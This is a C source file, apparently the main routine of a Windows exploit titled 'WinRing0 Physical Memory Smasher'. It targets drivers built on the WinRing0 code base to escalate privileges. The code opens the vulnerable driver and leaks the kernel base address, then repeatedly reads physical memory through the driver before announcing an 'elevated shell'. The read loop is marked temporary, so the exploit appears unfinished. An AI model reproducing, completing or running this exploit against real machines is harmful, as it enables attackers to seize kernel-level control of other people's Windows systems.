#include "exploit.h"

int main(int argc, char** argv)
{
	unsigned char output[0xC0000] = { 0 };
	HANDLE device_driver = (HANDLE)-1;
	HMODULE ntdll = (HMODULE)0;
	unsigned long long kernel_base = 0LL;
	unsigned char unused = 0;

	RtlSecureZeroMemory(&output, sizeof(output));

	SetConsoleTitleA("WinRing0 Physical Memory Smasher");

	printf("[*] WinRing0 Exploit - WinRing0 Physical Memory Elevation of Privilege Vulnerability\n[*] This exploit targets all device drivers reliant on the WinRing0 code-base\n[*] Exploit written by ExAllocatePool2\n");

	if (!argv[1])
	{
		printf("\n[*] Usage: kernelsmasher.exe <target driver symbolic link>\n[*] Example: kernelsmasher.exe \\\\.\\GLOBALROOT\\Device\\WinRing0_1_2_0");
		unused = getchar();
		return 0;
	}

	printf("\n[*] Target device driver: %s\n[*] Press \"ENTER\" to begin exploitation...", argv[1]);
	unused = getchar();

	device_driver = CreateFileA(argv[1], GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
	if (device_driver == (HANDLE)-1)
	{
		printf("[-] Failed to obtain a handle to the target device driver. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("[+] Obtained a handle to the target device driver. Handle Value: 0x%p", device_driver);

	ntdll = LoadLibraryA("C:\\Windows\\System32\\ntdll.dll");
	if (!ntdll)
	{
		printf("\n[-] Failed to load the \"ntdll.dll\" module. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Loaded the \"ntdll.dll\" module. Module Handle: 0x%p", ntdll);

	kernel_base = leak_ntoskrnl_base_address(ntdll);
	if (!kernel_base)
	{
		return 1;
	}

	// TEMP
	int test = 0;
	while (1)
	{
		if (!ReadPhysicalMemory(device_driver, &test, &output, sizeof(output), 1))
		{
			printf("\nerror");
		}

		test += sizeof(output);
	}
	// TEMP

	printf("\n[+] Finished. Enjoy your elevated shell!");
	unused = getchar();
	return 0;
}